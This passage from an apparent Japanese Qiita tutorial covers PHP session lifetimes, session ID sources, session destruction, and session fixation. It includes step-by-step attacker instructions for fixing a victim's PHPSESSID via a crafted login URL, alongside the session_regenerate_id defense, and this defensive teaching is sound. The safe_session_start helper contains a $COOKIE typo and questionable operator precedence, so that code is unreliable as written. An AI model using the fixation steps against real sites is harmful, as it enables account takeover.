<span id="ユーザー側のクッキーファイルの有効期限" class="fragment"></span><a href="#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E5%81%B4%E3%81%AE%E3%82%AF%E3%83%83%E3%82%AD%E3%83%BC%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90"><i class="fa fa-link"></i></a>ユーザー側のクッキーファイルの有効期限</h3>

<p>以下のいずれかを実行します．設定は，<a href="http://php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> の実行よりも前にする必要があることに注意してください．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">これらのうちいずれかを使う</span></div>
<div class="highlight"><pre><span></span><span class="c1">// どのバージョンでも使える書き方</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.cookie_lifetime'</span><span class="p">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>

<span class="c1">// PHP7.0以降で使える書き方</span>
<span class="nb">session_start</span><span class="p">([</span><span class="s1">'cookie_lifetime'</span> <span class="o">=&gt;</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">]);</span>
</pre></div>
</div>

<p>デフォルト値は <strong><code>0</code></strong> <strong>(ブラウザを閉じるまで)</strong> となっています．それ以外の場合，有効期限は<ins>最初のアクセスから</ins>指定した期間までとなります．後ほど紹介しますが，再アクセスで自動延長したい場合には少し工夫が必要です．</p>

<p>【注意】<br>
<a href="http://www.php.net/manual/ja/function.setcookie.php" rel="nofollow noopener" target="_blank">setcookie</a> 関数の <strong><code>$expire</code></strong> の表記の違いに注意してください．こちらは秒数ではなく<strong>タイムスタンプ</strong>での指定となっております．</p>

<p><a href="https://camo.qiitausercontent.com/2178e09bbb99bfcc876e2b7daa0e7594bcddae2c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31393766643634662d653364302d653164302d636339362d6238363437613961613834392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2178e09bbb99bfcc876e2b7daa0e7594bcddae2c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31393766643634662d653364302d653164302d636339362d6238363437613961613834392e706e67" alt="ss (2014-02-23 at 05.03.21).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/197fd64f-e3d0-e1d0-cc96-b8647a9aa849.png"></a><br>
<a href="https://camo.qiitausercontent.com/71d0008a305d740ba4c8c20ccd40fae3528a868a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61326363643530362d303639312d373030652d396566352d3730303134393235623831382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/71d0008a305d740ba4c8c20ccd40fae3528a868a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f61326363643530362d303639312d373030652d396566352d3730303134393235623831382e706e67" alt="ss (2014-02-23 at 05.04.02).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/a2ccd506-0691-700e-9ef5-70014925b818.png"></a></p>

<h3>
<span id="どのように2つの有効期限が関連してくるか" class="fragment"></span><a href="#%E3%81%A9%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB2%E3%81%A4%E3%81%AE%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90%E3%81%8C%E9%96%A2%E9%80%A3%E3%81%97%E3%81%A6%E3%81%8F%E3%82%8B%E3%81%8B"><i class="fa fa-link"></i></a>どのように2つの有効期限が関連してくるか？</h3>

<p>問題が発生する2通りのケースを考えてみましょう．</p>

<h4>
<span id="サーバー側にセッションファイルが残っているのにセッション用のcookieが消滅してしまったとき" class="fragment"></span><a href="#%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E5%81%B4%E3%81%AB%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8C%E6%AE%8B%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%AB%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%94%A8%E3%81%AEcookie%E3%81%8C%E6%B6%88%E6%BB%85%E3%81%97%E3%81%A6%E3%81%97%E3%81%BE%E3%81%A3%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a><font color="silver">サーバー側にセッションファイルが残っているのに，セッション用のCookieが消滅してしまったとき</font>
</h4>

<p>単純に，サーバー側のセッションファイルが <strong>24分間</strong> の期限と $\frac{1}{100}$ の確率の削除を待つだけです．</p>

<h4>
<span id="セッション用のcookieが送信されているのにサーバー側のセッションファイルが既に削除されていたとき" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E7%94%A8%E3%81%AEcookie%E3%81%8C%E9%80%81%E4%BF%A1%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%AB%E3%82%B5%E3%83%BC%E3%83%90%E3%83%BC%E5%81%B4%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8C%E6%97%A2%E3%81%AB%E5%89%8A%E9%99%A4%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a><font color="silver">セッション用のCookieが送信されているのに，サーバー側のセッションファイルが既に削除されていたとき</font>
</h4>

<p>送信されてきたセッションIDを元に，セッションファイルが再生成されます．また，もとから無効であった場合にもセッションファイルの生成は行われます．後者は特に <strong>セッションアダプション</strong> と呼ばれ，場合によっては脆弱性という扱いを受けます．</p>

<p>この挙動を変更することが出来るのがphp.iniの <a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-strict-mode" rel="nofollow noopener" target="_blank">session.use_strict_mode</a> ディレクティブです．デフォルトでは無効ですが，これを有効にすることで，無効なセッションIDであると判明した場合にセッションIDの再生成が行われ，ユーザーに向けて <strong>Set-Cookieヘッダー</strong> が新たに送信されます．ただし，<ins>このディレクティブにはほとんどセキュリティ対策の意味はありません</ins>．PHP7.1にて<a href="https://wiki.php.net/rfc/session-use-strict-mode" rel="nofollow noopener" target="_blank">デフォルトで有効するというRFC</a>もありましたが，賛成4対反対4で却下されています．</p>

<p>この機能が存在しないPHP5.5.1よりも古い環境で，手動で「セッションファイルが存在するか」を調べてアダプションを検知し，対策することは可能です．しかしこの対策はあまり意味が無いので，特に拘りが無ければ最初のままでいいかもしれません．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">アダプション検知を付加したsession_start関数 (ついでにsession_start関数が吐きうるエラーに@演算子無しで対策している)</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">safe_session_start</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">session_name</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">session_name</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span>
        <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span> <span class="k">and</span>
        <span class="o">!</span><span class="nb">ctype_alnum</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span> <span class="o">||</span>
        <span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s1">'/sess_'</span> <span class="o">.</span> <span class="nv">$COOKIE</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span>
    <span class="p">)</span> <span class="p">{</span>
        <span class="nb">unset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$name</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">session_start</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="有効期限を長くするにはどうすればいいか" class="fragment"></span><a href="#%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90%E3%82%92%E9%95%B7%E3%81%8F%E3%81%99%E3%82%8B%E3%81%AB%E3%81%AF%E3%81%A9%E3%81%86%E3%81%99%E3%82%8C%E3%81%B0%E3%81%84%E3%81%84%E3%81%8B"><i class="fa fa-link"></i></a>有効期限を長くするにはどうすればいいか？</h2>

<p>上で紹介した2つの有効期限を同等に設定すれば可能です．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">有効期限を1週間にする例</span></div>
<div class="highlight"><pre><span></span><span class="c1">// どのバージョンでも使える書き方</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.gc_maxlifetime'</span><span class="p">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'session.cookie_lifetime'</span><span class="p">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">// PHP7.0以降で使える書き方</span>
<span class="nb">session_start</span><span class="p">([</span>
    <span class="s1">'gc_maxlifetime'</span> <span class="o">=&gt;</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">,</span>
    <span class="s1">'cookie_lifetime'</span> <span class="o">=&gt;</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">7</span><span class="p">,</span>
<span class="p">]);</span>
</pre></div>
</div>

<p>但し，これでは<ins>再アクセスによるCookieの有効期限の延長は行われません</ins>．これを実現したければ，自前で <strong>Set-Cookieヘッダー</strong> を送信させる必要があります．以下の記事でこれを実現した関数を紹介しています．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/7f4772e4d4d360fc100c" id="reference-6be9edc6bd5adbfa7770">Qiita - ぼくのかんがえたさいきょうのsession_start</a></li>
</ul>

<h2>
<span id="実はcookie以外にもセッションidを受け取る手段がある" class="fragment"></span><a href="#%E5%AE%9F%E3%81%AFcookie%E4%BB%A5%E5%A4%96%E3%81%AB%E3%82%82%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3id%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8B%E6%89%8B%E6%AE%B5%E3%81%8C%E3%81%82%E3%82%8B"><i class="fa fa-link"></i></a>実はCookie以外にもセッションIDを受け取る手段がある！？</h2>

<p>今までセッションについて，Cookieで個人を判別するものとして話を進めてきましたが，実は他にも手段があります．以下，優先順位の高い順に述べます．なお，ここで登場するphp.iniのディレクティブのうち，<code>session.*</code> のものは全て <a href="http://www.php.net/manual/ja/function.ini-set.php" rel="nofollow noopener" target="_blank">ini_set</a> 関数で変更可能なものです．</p>

<h3>
<span id="1-_cookie" class="fragment"></span><a href="#1-_cookie"><i class="fa fa-link"></i></a>1. <code>$_COOKIE</code>
</h3>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-cookies" rel="nofollow noopener" target="_blank">session.use_cookies</a> が有効な場合のみ採用されます．デフォルトは有効です．</li>
<li>ユーザー側に <strong>Set-Cookieヘッダー</strong> が自動的に送信されるようになります．</li>
</ul>

<h3>
<span id="2-_get" class="fragment"></span><a href="#2-_get"><i class="fa fa-link"></i></a>2. <code>$_GET</code>
</h3>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-only-cookies" rel="nofollow noopener" target="_blank">session.use_only_cookies</a> が無効な場合のみ採用されます．デフォルトは<ins>PHP5.2以前では無効</ins>，PHP5.3以降では有効です．</li>
<li>
<p>以下の条件を全て満たしたとき，HTML中に存在するURLに対してクエリが自動で付加されます．</p>

<ul>
<li>
<a href="http://www.php.net/manual/ja/session.configuration.php#ini.session.use-trans-sid" rel="nofollow noopener" target="_blank">session.use_trans_sid</a> が有効である．</li>
<li>出力バッファリングを行っていなければならない．つまり <a href="http://www.php.net/manual/ja/function.ob-get-level.php" rel="nofollow noopener" target="_blank">ob_get_level</a> 関数の返り値が1以上でなければならない． <a href="http://www.php.net/manual/ja/outcontrol.configuration.php#ini.output-buffering" rel="nofollow noopener" target="_blank">output_buffering</a> が無効な場合は最初に <a href="http://www.php.net/manual/ja/function.ob-start.php" rel="nofollow noopener" target="_blank">ob_start</a> 関数をコールしておく必要がある．</li>
<li>相対URL(絶対パス・相対パス)でなければならない．外部サイトに送信してしまうリスクがあるため，<ins>絶対URLには付加されない</ins>．</li>
</ul>
</li>
<li><p>手動で付加する場合には，定数 <strong><code>SID</code></strong> を使用します．<code>'PHPSESSID=xxxxx'</code> のような値が自動的に設定されています．</p></li>
</ul>

<p>…とはいっても，PHP5.3以降デフォルトで使われるのは <code>$_COOKIE</code> 1つだけです．Cookieを使えないガラケーなんてもはやこの世に存在するかどうか怪しいですが，古代の端末向けにWebサイトを作らなければならない地雷案件があった場合に，設定を変更した上で他の手段を使うことがあるかもしれません．</p>

<p>3番以降の続きは<a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%80%8B%E4%BA%BA%E8%AD%98%E5%88%A5%E7%94%A8%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E5%AE%8C%E5%85%A8%E7%89%88-%E5%84%AA%E5%85%88%E5%BA%A6%E9%A0%86">付録</a>に載せておきます．2番までは地雷案件で使うことがあったとしても，3番以降は本当に皆無でしょう…</p>

<h2>
<span id="セッション固定攻撃って何どうやって対策するの" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E5%9B%BA%E5%AE%9A%E6%94%BB%E6%92%83%E3%81%A3%E3%81%A6%E4%BD%95%E3%81%A9%E3%81%86%E3%82%84%E3%81%A3%E3%81%A6%E5%AF%BE%E7%AD%96%E3%81%99%E3%82%8B%E3%81%AE"><i class="fa fa-link"></i></a>「セッション固定攻撃」って何？どうやって対策するの？</h2>

<h3>
<span id="攻撃対象" class="fragment"></span><a href="#%E6%94%BB%E6%92%83%E5%AF%BE%E8%B1%A1"><i class="fa fa-link"></i></a>攻撃対象</h3>

<p>この攻撃手法においては，ログインする前から <a href="http://www.php.net/manual/ja/function.session-start.php" rel="nofollow noopener" target="_blank">session_start</a> 関数によりセッションが開始されているサイトが対象となります．多くのサイトがこの実装になっていると思います．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">ログイン前からセッションを開始してログイン状態のチェックを行っている例</span></div>
<div class="highlight"><pre><span></span><span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'logined'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="o">....</span>
<span class="p">}</span>
</pre></div>
</div>

<p>以下に攻撃を受けるケースを述べます．</p>

<h4>
<span id="cookie以外からのセッションidを受け入れる場合" class="fragment"></span><a href="#cookie%E4%BB%A5%E5%A4%96%E3%81%8B%E3%82%89%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3id%E3%82%92%E5%8F%97%E3%81%91%E5%85%A5%E3%82%8C%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><font color="silver">Cookie以外からのセッションIDを受け入れる場合</font>
</h4>

<ol>
<li>攻撃者のあなたはログインフォームにアクセスして，発行された自分用のセッションID <code>PHPSESSID=xxxxx</code> を入手します．</li>
<li>
<code>http://example.com/login.php?PHPSESSID=xxxxx</code> というURLをメールやTwitterなどの手段を使ってターゲットに踏ませます．この段階で，あなたとターゲットのセッションIDが共通なものになります．つまりサーバー側から見れば，<ins>あなたのWebブラウザとターゲットのWebブラウザが同じものと見なされます</ins>．</li>
<li>ターゲットがログイン状態になれば，あなたもターゲットのアカウントでログイン状態になります．攻撃成功です．</li>
</ol>

<h4>
<span id="cookie以外からのセッションidを拒否しているがxss脆弱性がある場合" class="fragment"></span><a href="#cookie%E4%BB%A5%E5%A4%96%E3%81%8B%E3%82%89%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3id%E3%82%92%E6%8B%92%E5%90%A6%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8Cxss%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%8C%E3%81%82%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><font color="silver">Cookie以外からのセッションIDを拒否しているが，XSS脆弱性がある場合</font>
</h4>

<p>セキュリティコンサルタントをされている徳丸浩さんのTumblr記事で分かりやすい例が紹介されています．要はJavaScriptを実行できれば，クエリを踏ませなくてもセッションIDを共通なものに設定することが可能だということです．先ほど，</p>

<blockquote>
<p>ただし，<ins>このディレクティブにはほとんどセキュリティ対策の意味はありません</ins>．</p>
</blockquote>

<p>とした理由もここで分かります．</p>

<ul>
<li><a href="http://tumblr.tokumaru.org/post/37676352092/session-adoption-and-session-fixation" rel="nofollow noopener" target="_blank">徳丸浩のtumblr - セッションアダプションがなくてもセッションフィクセイション攻撃は可能</a></li>
</ul>

<h3>
<span id="対策方法" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>対策方法</h3>

<p>ではどうやって対策すればいいか？答えは単純明快，ログイン直後に次のコードを実行するだけです．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHP5.1以降 (オプションで古いセッションファイルを自動的に削除可能)</span></div>
<div class="highlight"><pre><span></span><span class="nb">session_regenerate_id</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
</pre></div>
</div>

<p><a href="http://php.net/manual/ja/function.session-regenerate-id.php" rel="nofollow noopener" target="_blank">session_regenerate_id</a> 関数は，セッションIDを新規生成したものに乗り換える関数です．この関数は非常に重要なので，初めて見られた方は必ず覚えておいてください．上記のコードを実行した場合，以下の動作が行われます．</p>

<ol>
<li>セッションファイルを新しい名前にしてコピーする</li>
<li>古いセッションファイルを削除する</li>
<li>ユーザーに新たに <strong>Set-Cookieヘッダー</strong> を送信する</li>
</ol>

<p>要は，ログインしたタイミングで<ins>新しいセッションに乗り換え</ins>れば，誰かに目をつけられていてもそこで振り切れるということです．<strong>新しくセットした認証情報は古いセッションファイルには書き込まれない</strong>ので，必ずしもオプションの指定が必須というわけではないですが，<code>true</code>を指定しておくほうが一般的です。</p>

<p>なおこの関数を全てのページに使っていると，当然サーバーに対してものすごく負荷がかかる上にセッションの引継ぎがうまくいかない問題も発生してくるようです．<ins>ログイン直後</ins>に限定するようにしましょう．</p>

<h2>
<span id="セッションを破棄させるにはどうしたらいいか" class="fragment"></span><a href="#%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E7%A0%B4%E6%A3%84%E3%81%95%E3%81%9B%E3%82%8B%E3%81%AB%E3%81%AF%E3%81%A9%E3%81%86%E3%81%97%E3%81%9F%E3%82%89%E3%81%84%E3%81%84%E3%81%8B"><i class="fa fa-link"></i></a>セッションを破棄させるにはどうしたらいいか？</h2>

<p>次のエントリに易しい説明があります．</p>

<ul>
<li><a href="http://d.hatena.ne.jp/Kappuccino/20080726/1217049706" rel="nofollow noopener" target="_blank">プログラマはサイコロを振らない - PHPでセッションを完全に破棄する方法</a></li>
</ul>

<p>ここではスポーツクラブの比喩が用いられていますが，完全に理解にするにはこの比喩はかえって妨げになると感じたので，事実のままに述べることにします．なお，セッション変数の特定のインデックスのみを削除したい場合は単純に</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]);</span>
</pre></div></div>

<p>としてください．以下，セッション変数全体を空にする操作についてのみ言及します．</p>

<h3>
<span id="a-_session-に空配列を代入する" class="fragment"></span><a href="#a-_session-%E3%81%AB%E7%A9%BA%E9%85%8D%E5%88%97%E3%82%92%E4%BB%A3%E5%85%A5%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>(A) <code>$_SESSION</code> に空配列を代入する</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_SESSION</span> <span class="o">=</span> <span class="p">[];</span>
</pre></div></div>

<p>サーバー側のメモリー上に存在している <strong><code>$_SESSION</code></strong> に格納された情報を全て削除します．</p>

<ul>
<li>
<ins>現在のスクリプト実行が終了するまで</ins>の間はディスク上に存在している <strong>セッションファイル</strong> に書き込まれている情報はリセットされません．</li>
<li>ユーザー側の <strong>セッション用のCookie</strong> には何の影響も与えません．</li>
</ul>

<h3>
<span id="b-session_destroy-関数をコールする" class="fragment"></span><a href="#b-session_destroy-%E9%96%A2%E6%95%B0%E3%82%92%E3%82%B3%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>(B) <a href="http://www.php.net/manual/ja/function.session-destroy.php" rel="nofollow noopener" target="_blank">session_destroy</a> 関数をコールする</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">session_destroy</span><span class="p">();</span>
</pre></div></div>

<p>サーバー側のディスク上に存在している <strong>セッションファイル</strong> 自体を強制的に削除します．</p>

<ul>
<li>
<ins>現在のスクリプト実行が終了するまで</ins>の間はメモリー上に存在している <strong><code>$_SESSION</code></strong> が保持している情報はリセットされません．</li>
<li>ユーザー側の <strong>セッション用のCookie</strong> には何の影響も与えません．</li>
</ul>

<h3>
<span id="c-有効期限を過去にして-setcookie-関数をコールする" class="fragment"></span><a href="#c-%E6%9C%89%E5%8A%B9%E6%9C%9F%E9%99%90%E3%82%92%E9%81%8E%E5%8E%BB%E3%81%AB%E3%81%97%E3%81%A6-setcookie-%E9%96%A2%E6%95%B0%E3%82%92%E3%82%B3%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>(C) 有効期限を過去にして <a href="http://www.php.net/manual/ja/function.setcookie.php" rel="nofollow noopener" target="_blank">setcookie</a> 関数をコールする</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">setcookie</span><span class="p">(</span><span class="nb">session_name</span><span class="p">(),</span> <span class="s1">''</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">);</span>
</pre></div></div>

<p>ユーザー側のセッション用のCookieを破棄させます． <strong><code>$path</code></strong><ins>を指定する必要がある</ins>ことに注意してください．</p>

<ul>
<li>メモリー上に存在している <strong><code>$_SESSION</code></strong> が保持している情報には何の影響も与えません．</li>
<li>ディスク上に存在している <strong>セッションファイル</strong> に書き込まれている情報には何の影響も与えません．</li>
</ul>

<p><strong>A</strong>, <strong>B</strong>, <strong>C</strong> それぞれの役割を明確にして箇条書きにしてみました．これを全部行っておけば万全なのですが，全て行う必要があるかどうかと言えばそうではありません．</p>

<h3>
<span id="aだけを行った場合" class="fragment"></span><a href="#a%E3%81%A0%E3%81%91%E3%82%92%E8%A1%8C%E3%81%A3%E3%81%9F%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>Aだけを行った場合</h3>

<ul>
<li>ディスク領域的には問題ないですが，0バイトのセッションファイルが残ります．</li>
<li>甲さんがログアウトした後すぐに乙さんが同じWebブラウザからログインしてきた場合，甲さんが使っていたセッションファイルに乙さんの情報が上書きされます．甲さんが自分のセッションIDを控えていた場合，乙さんになりすますことが出来ます．セッション固定攻撃の場合も同様です．但し，ログイン直後に <ins><a href="http://www.php.net/manual/ja/function.session-regenerate-id.php" rel="nofollow noopener" target="_blank">session_regenerate_id</a> 関数をコールしている場合には安全</ins>です．</li>
</ul>

<h3>
<span id="bだけを行った場合" class="fragment"></span><a href="#b%E3%81%A0%E3%81%91%E3%82%92%E8%A1%8C%E3%81%A3%E3%81%9F%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>Bだけを行った場合</h3>

<ul>
<li>スクリプト終了時までに再度 <code>$_SESSION</code> にアクセスするようなコードを書いていた場合，アプリケーションが誤作動する可能性があります．</li>
<li>甲さんがログアウトした後すぐに乙さんが同じWebブラウザからログインしてきた場合，甲さんが使っていたセッションファイルと同じファイル名で乙さんの情報が保存されます．甲さんが自分のセッションIDを控えていた場合，乙さんになりすますことが出来ます．セッション固定攻撃の場合も同様です．但し，ログイン直後に <ins><a href="http://www.php.net/manual/ja/function.session-regenerate-id.php" rel="nofollow noopener" target="_blank">session_regenerate_id</a> 関数をコールしている場合には安全</ins>です．</li>
</ul>

<h3>
<span id="cだけを行った場合" class="fragment"></span><a href="#c%E3%81%A0%E3%81%91%E3%82%92%E8%A1%8C%E3%81%A3%E3%81%9F%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>Cだけを行った場合</h3>

<ul>
<li>スクリプト終了時までに再度 <code>$_SESSION</code> にアクセスするようなコードを書いていた場合，アプリケーションが誤作動する可能性があります．</li>
<li>不要になったセッションファイルが削除されるまでの間無駄にディスク領域を圧迫してしまうことになります．</li>
<li>
<strong>A</strong> , <strong>B</strong> のように共用パソコンでのトラブルは防げますが，これだけではセッション固定攻撃までは防げません．但し，そもそもセッション固定攻撃を成立させなくしてしまえばいいので，やはりログイン直後に <ins><a href="http://www.php.net/manual/ja/function.session-regenerate-id.php" rel="nofollow noopener" target="_blank">session_regenerate_id</a> 関数をコールしている場合には安全</ins>です．</li>
</ul>

<p>極論を言います． <a href="http://www.php.net/manual/ja/function.session-regenerate-id.php" rel="nofollow noopener" target="_blank">session_regenerate_id</a> 関数のコールを行ってしまえば，後はどうしようと安全なのです．お好みで選択されても構わないし，万全を期して全部行っておいても問題ないです．個人的には， <strong>A</strong> , <strong>B</strong> は両方行い， <strong>C</strong> は行わなくてもよいという意見です．</p>

<p>逆に，セッションを破棄させる上で<strong>やってはいけないこと</strong>を以下に挙げてみます．</p>

<h3>
<span id="d-シンボルテーブルから-_session-を削除する" class="fragment"></span><a href="#d-%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%8B%E3%82%89-_session-%E3%82%92%E5%89%8A%E9%99%A4%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>(D) シンボルテーブルから <code>$_SESSION</code> を削除する</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</pre></div></div>

<p>そのスクリプト実行中にはスーパーグローバル変数の<ins>セッションに関わる機能を全て使えなくしてしまいます</ins>．但し，セッションの情報が消失するわけではありません．次回のスクリプト実行時には復活します．</p>

<h3>
<span id="e-_session-という変数自体が配列以外になるように操作を加える" class="fragment"></span><a href="#e-_session-%E3%81%A8%E3%81%84%E3%81%86%E5%A4%89%E6%95%B0%E8%87%AA%E4%BD%93%E3%81%8C%E9%85%8D%E5%88%97%E4%BB%A5%E5%A4%96%E3%81%AB%E3%81%AA%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E6%93%8D%E4%BD%9C%E3%82%92%E5%8A%A0%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>(E) <code>$_SESSION</code> という変数自体が配列以外になるように操作を加える</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</pre></div></div>

<p>このケースは <strong>D</strong> と類似しているように思われますが，厳密には異なります．これを行った後に通常の代入操作を行う，例えば</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'bar'</span><span class="p">;</span>
</pre></div></div>

<p>とすると，セッションの機能は復活します．但し，それまでにあった情報は失われます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$_SESSION</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'foo'</span> <span class="o">=&gt;</span> <span class="s1">'bar'</span><span class="p">];</span>
</pre></div></div>

<p>のように書いた方が分かりやすいかもしれません．</p>

<h2>
